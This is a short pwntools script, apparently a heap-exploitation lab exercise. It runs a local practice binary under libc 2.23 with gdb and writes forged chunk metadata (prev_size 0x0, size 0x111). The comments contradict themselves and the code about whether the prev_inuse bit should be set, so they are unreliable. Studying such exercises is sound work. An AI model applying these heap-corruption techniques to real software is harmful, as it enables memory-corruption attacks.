from pwn import * 

mode = 'DEBUG' # Turn on gdb
libc_name='../../../libc_versions/2.23/libc-2.23.so'
env = {}

# Binary setup
elf_name = './.fix_chunk'

elf = ELF(elf_name)
if libc_name != '':
        libc = ELF(libc_name)
        env = {"LD_PRELOAD": libc.path}

# Process creation 
if mode == 'DEBUG':
        p = process([elf.path],env=env)
        gdb.attach(p, gdbscript='''
dir ../../../libc_versions/2.23/
''')

'''
Below is the heap layout: 
=============================

bottom - 0xa0 (free)
-----------
top    - 0x110 (in use) 
-----------
filler - 0x20 (in use) 
-----------

The previous chunks IS in use. So, this means that the value
of 'prev_size' is NOT being used.
'''
prev_size = p64(0x0) 


'''
This ORIGINAL chunk size is 0x110. So, this is the size of it. 

Additionally, the previous chunk is NOT in use. So, 
the 'prev_inuse' bit should NOT be set. So, the metadata
of the chunk (n,m,p) should all be 0. 

'''
size = p64(0x110 | 0x1) 

'''
prev_size: 0x0
size: 0x111
'''
p.sendline(prev_size + size)

p.interactive()
